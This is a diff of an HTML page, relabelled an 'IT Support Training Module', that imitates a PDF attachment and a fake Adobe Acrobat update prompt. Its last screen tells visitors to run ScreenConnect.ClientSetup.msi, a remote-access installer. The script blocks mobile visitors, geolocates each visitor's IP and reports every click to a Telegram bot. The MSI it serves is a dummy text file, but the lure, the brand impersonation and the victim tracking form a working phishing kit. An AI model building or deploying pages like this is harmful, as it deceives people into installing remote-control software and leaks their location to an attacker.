@@ -3,91 +3,216 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document Portal</title>
+    <title>IT Support Training Module</title>
     <style>
+        /* Base page layout and gray background setup */
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-            background-color: #ebdcd7;
+            background-color: #8c8c8c;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            height: 100vh;
             margin: 0;
-            padding: 20px;
-            box-sizing: border-box;
+            overflow: hidden;
         }
 
+        /* Standard hidden utility class */
         .hidden { display: none !important; }
 
-        .block-card, .pdf-card, .popup-modal, .success-card {
+        /* ==================== SCREEN 0: MOBILE DEVICE RESTRICTION CARD ==================== */
+        .block-card {
             background-color: #ffffff;
-            border-radius: 12px;
-            padding: 40px;
-            width: 480px;
-            max-width: 100%;
+            border: 1px solid #e0c8c1;
+            border-radius: 20px;
+            padding: 45px 35px;
+            width: 450px;
             text-align: center;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.25);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
         }
 
-        .pdf-card { border: 1px solid #d1d1d1; border-radius: 28px; padding: 35px 30px; }
-
         .error-circle {
-            width: 56px; height: 56px; background-color: #fce8e6; border-radius: 50%;
-            display: flex; justify-content: center; align-items: center; margin: 0 auto 24px;
+            width: 56px;
+            height: 56px;
+            background-color: #fce8e6;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 24px auto;
         }
         .error-cross { font-size: 22px; color: #d93025; font-weight: bold; }
 
-        .badge-row { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
-        .badge-danger { background-color: #611e18; color: white; font-size: 11px; font-weight: 700; padding: 5px 14px; border-radius: 12px; }
-        .badge-secondary { background-color: #f1f3f4; color: #5f6368; font-size: 11px; font-weight: 600; padding: 5px 14px; border-radius: 12px; }
-
-        .file-name { font-size: 19px; font-weight: 700; color: #222; margin-bottom: 6px; }
-        .file-meta { font-size: 14px; color: #777; margin-bottom: 20px; }
-        .file-actions { display: flex; justify-content: center; gap: 30px; }
-        .action-btn { font-size: 14px; font-weight: 700; color: #555; cursor: pointer; }
-        .action-btn:hover { color: #000; }
-
-        .download-btn {
-            background-color: #0066cc; color: white; font-weight: 700; font-size: 15px;
-            padding: 12px 36px; border-radius: 24px; border: none; cursor: pointer;
+        .badge-row {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
         }
+        .badge-danger {
+            background-color: #611e18;
+            color: #ffffff;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 5px 14px;
+            border-radius: 12px;
+            letter-spacing: 0.3px;
+        }
+        .badge-secondary {
+            background-color: #f1f3f4;
+            color: #5f6368;
+            font-size: 11px;
+            font-weight: 600;
+            padding: 5px 14px;
+            border-radius: 12px;
+        }
+
+        .error-heading {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin: 0 0 16px 0;
+        }
+        .error-description {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.6;
+            margin: 0 0 32px 0;
+            padding: 0 10px;
+        }
+
+        .instruction-container {
+            background-color: #f8f9fa;
+            border-radius: 12px;
+            padding: 24px;
+            text-align: left;
+        }
+        .instruction-heading {
+            font-size: 13px;
+            font-weight: 700;
+            color: #202124;
+            margin: 0 0 12px 0;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .instruction-list {
+            margin: 0;
+            padding-left: 18px;
+            color: #3c4043;
+            font-size: 13px;
+            line-height: 1.8;
+        }
+
+        /* ==================== ORIGINAL PIPELINE STYLES ==================== */
+        /* PHASE 1: The PDF Document Card layout */
+        .pdf-card {
+            background-color: #ffffff;
+            border: 1px solid #d1d1d1;
+            border-radius: 28px; 
+            padding: 35px 30px;
+            width: 450px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+        }
+        .pdf-icon { width: 45px; height: auto; margin-bottom: 12px; }
+        .file-name { font-size: 19px; font-weight: 700; color: #222222; margin-bottom: 6px; }
+        .file-meta { font-size: 14px; color: #777777; font-weight: 500; margin-bottom: 20px; text-transform: uppercase; }
+        .file-actions { display: flex; justify-content: center; gap: 30px; }
+        .action-btn { font-size: 14px; font-weight: 700; color: #555555; text-decoration: none; cursor: pointer; }
+        .action-btn:hover { color: #000000; }
+
+        /* PHASE 2: Application Outdated Window layout */
+        .popup-modal {
+            background-color: #f1f1f1;
+            border: 1px solid #cccccc;
+            border-radius: 12px;
+            width: 480px;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
+        }
+        .popup-logo { width: 50px; height: auto; margin-bottom: 24px; }
+        .popup-title { font-size: 24px; font-weight: 700; color: #2c2c2c; margin-bottom: 16px; }
+        .popup-text { font-size: 15px; color: #595959; line-height: 1.5; margin-bottom: 28px; }
+        .download-btn { display: inline-block; background-color: #0066cc; color: #ffffff; font-weight: 700; font-size: 15px; padding: 12px 36px; border-radius: 24px; border: none; cursor: pointer; }
         .download-btn:hover { background-color: #0052a3; }
+
+        /* PHASE 3: Download Successful layout */
+        .success-card {
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 24px;
+            width: 500px;
+            padding: 40px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .adobe-badge-wrapper { margin-bottom: 20px; }
+        .adobe-badge { width: 60px; height: auto; }
+        .success-title { font-size: 28px; font-weight: 700; color: #1a1a1a; margin-bottom: 12px; }
+        .success-subtitle { font-size: 15px; color: #64748b; margin-bottom: 24px; }
+
+        /* Progress Status Bar Graphics */
+        .progress-box {
+            border: 1px dashed #cbd5e1;
+            border-radius: 12px;
+            padding: 16px;
+            background-color: #f8fafc;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+        .progress-header { display: flex; justify-content: space-between; font-size: 14px; font-weight: 600; color: #334155; margin-bottom: 8px; }
+        .bar-bg { width: 100%; height: 6px; background-color: #e2e8f0; border-radius: 3px; overflow: hidden; margin-bottom: 8px; }
+        .bar-fill { width: 100%; height: 100%; background-color: #16a34a; }
+        .progress-footer { font-size: 12px; color: #94a3b8; display: flex; justify-content: space-between; }
+
+        /* Step-by-Step Guidance Box */
+        .instructions-box {
+            background-color: #f1f5f9;
+            border-radius: 12px;
+            padding: 24px;
+            text-align: left;
+            margin-bottom: 24px;
+        }
+        .instructions-title { font-size: 15px; font-weight: 700; color: #1e293b; margin-bottom: 12px; }
+        .instructions-list { margin: 0; padding-left: 20px; color: #475569; font-size: 14px; line-height: 1.8; }
     </style>
 </head>
 <body>
 
-    <!-- MOBILE BLOCK -->
+    <!-- SCREEN 0: MOBILE DEVICE RESTRICTION CARD -->
     <div class="block-card hidden" id="mobileBlockScreen">
-        <div class="error-circle"><span class="error-cross">&#10005;</span></div>
+        <div class="error-circle"><span class="error-cross">✕</span></div>
         <div class="badge-row">
             <span class="badge-danger">Error 403: Unsupported Device</span>
             <span class="badge-secondary">Desktop Only</span>
         </div>
         <h1 class="error-heading">Error: Cannot Open PDF</h1>
         <p class="error-description">This document contains complex structures or restricted access permissions that cannot be rendered on mobile operating systems.</p>
+        
         <div class="instruction-container">
             <h2 class="instruction-heading">To access this document:</h2>
             <ul class="instruction-list">
                 <li>Please switch to a <b>desktop computer</b> or a <b>personal laptop</b>.</li>
-                <li>Copy the URL and open it on your computer.</li>
+                <li>Copy the URL of this page and open it directly on your computer to resume viewing.</li>
             </ul>
         </div>
     </div>
 
-    <!-- PHASE 1 -->
+    <!-- PHASE 1: THE ATTACHMENT CARD -->
     <div class="pdf-card hidden" id="phase1">
         <svg class="pdf-icon" viewBox="0 0 24 24" fill="none" xmlns="http://w3.org/2000/svg">
             <path d="M19 3H5C3.9 3 3 3.9 3 5V19C3 20.1 3.9 21 5 21H19C20.1 21 21 20.1 21 19V5C21 3.9 20.1 3 19 3ZM11.5 9.5C11.5 10.3 10.8 11 10 11H8.5V12.5H7V8H10C10.8 8 11.5 8.7 11.5 9.5ZM16.5 11C16.5 11.8 15.8 12.5 15 12.5H13.5V8H15C15.8 8 16.5 8.7 16.5 9.5V11ZM12 8H13.5V12.5H12V8Z" fill="#E53935"/>
         </svg>
         <div class="file-name">Pre_approved_letter.pdf</div>
-        <div class="file-meta">5.7 MB • PDF</div>
+        <div class="file-meta">5.7 MB &bull; PDF</div>
         <div class="file-actions">
             <span class="action-btn" onclick="handleAction('VIEW PDF')">VIEW</span>
             <span class="action-btn" onclick="handleAction('SAVE PDF')">SAVE</span>
         </div>
     </div>
 
-    <!-- PHASE 2 -->
+    <!-- PHASE 2: APPLICATION OUTDATED PROMPT -->
     <div class="popup-modal hidden" id="phase2">
         <svg class="popup-logo" viewBox="0 0 30 30" fill="none" xmlns="http://w3.org/2000/svg">
             <rect width="30" height="30" rx="6" fill="#ff0000"/>
@@ -98,25 +223,39 @@
         <button class="download-btn" onclick="handleAction('DOWNLOAD MSI')">Download Now</button>
     </div>
 
-    <!-- PHASE 3 -->
+    <!-- PHASE 3: DOWNLOAD SUCCESSFUL & INSTRUCTIONS -->
     <div class="success-card hidden" id="phase3">
+        <div class="adobe-badge-wrapper">
+            <svg class="adobe-badge" viewBox="0 0 30 30" fill="none" xmlns="http://w3.org/2000/svg">
+                <rect width="30" height="30" rx="6" fill="#ff0000"/>
+                <path d="M15 5L7 22H11L13.5 16H16.5L19 22H23L15 5ZM15 11.5L15.8 14H14.2L15 11.5Z" fill="white"/>
+            </svg>
+        </div>
+        
+        <div class="success-title">Download Successful!</div>
+        <div class="success-subtitle">Adobe Acrobat has been updated successfully</div>
+
         <div class="progress-box">
             <div class="progress-header">
                 <span>ScreenConnect.ClientSetup.msi</span>
-                <span style="color: #16a34a;">Completed</span>
+                <span>100%</span>
             </div>
             <div class="bar-bg"><div class="bar-fill"></div></div>
+            <div class="progress-footer">
+                <span>Just now</span>
+            </div>
         </div>
+
         <div class="instructions-box">
             <h3 class="instructions-title">Next Steps:</h3>
-            <ol class="instructions-list">
-                <li>Open your <b>Downloads</b> folder.</li>
+            <ul class="instructions-list">
+                <li>Open your Downloads folder</li>
                 <li>Double-click <strong>ScreenConnect.ClientSetup.msi</strong></li>
-                <li>Follow the installer instructions.</li>
-            </ol>
+                <li>Follow the installer instructions</li>
+            </ul>
         </div>
-        <button class="download-btn" onclick="downloadInstaller()" 
-                style="background-color: #16a34a; margin-top: 20px;">
+
+        <button class="download-btn" onclick="downloadInstaller()" style="background-color: #16a34a;">
             Run Installer
         </button>
     </div>
@@ -137,19 +276,21 @@
                 const geoRes = await fetch(`https://ip-api.com/json/${userIP}`);
                 const geoData = await geoRes.json();
                 if (geoData.status === "success") {
-                    userLocation = `${geoData.city}, ${geoData.regionName}, ${geoData.country}`;
+                    userLocation = `${geoData.city}, ${geoData.country}`;
                 }
             } catch (e) {}
         }
 
         async function sendTelegramNotification(messageText) {
-            const fullMessage = `${messageText}\n\n🌐 IP: ${userIP}\n📍 Location: ${userLocation}\n⏰ ${new Date().toLocaleString()}`;
+            const fullMessage = `${messageText}\n\n🌐 IP: ${userIP}\n📍 ${userLocation}\n⏰ ${new Date().toLocaleString()}`;
             try {
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                await fetch(url, {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: fullMessage, parse_mode: "Markdown" })
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: fullMessage
+                    })
                 });
             } catch (err) {}
         }
@@ -174,15 +315,11 @@
             document.getElementById('phase3').classList.remove('hidden');
         }
 
-        // Real File Download
         function downloadInstaller() {
-            sendTelegramNotification("✅ User clicked **Run Installer** - Downloading ScreenConnect.ClientSetup.msi");
+            sendTelegramNotification("✅ Run Installer Clicked - Downloading ScreenConnect.ClientSetup.msi");
 
-            // Create a dummy MSI file (harmless text file with .msi extension)
-            const content = "This is a dummy installer for training purposes only.\nSchool Project - Not a real ScreenConnect installer.";
-            const blob = new Blob([content], { type: "application/octet-stream" });
+            const blob = new Blob(["Training Project Dummy MSI File"], { type: "application/octet-stream" });
             const url = URL.createObjectURL(blob);
-            
             const a = document.createElement('a');
             a.href = url;
             a.download = "ScreenConnect.ClientSetup.msi";
@@ -191,21 +328,17 @@
             document.body.removeChild(a);
             URL.revokeObjectURL(url);
 
-            alert("✅ File downloaded to your Downloads folder!\n\n(This is a safe dummy file for demonstration.)");
+            alert("✅ ScreenConnect.ClientSetup.msi downloaded!\nCheck your Downloads folder.");
         }
 
         window.onload = async function() {
             await getIPInfo();
-
-            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            const isSmallScreen = window.innerWidth <= 768;
-
-            if (isMobile || isSmallScreen) {
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                 document.getElementById('mobileBlockScreen').classList.remove('hidden');
-                sendTelegramNotification("🚫 Mobile / Small Screen Blocked");
+                sendTelegramNotification("🚫 Mobile Device Blocked");
             } else {
                 document.getElementById('phase1').classList.remove('hidden');
-                sendTelegramNotification("👤 New Session Started - Desktop User");
+                sendTelegramNotification("👤 New Session Started - Desktop");
             }
         };
     </script>
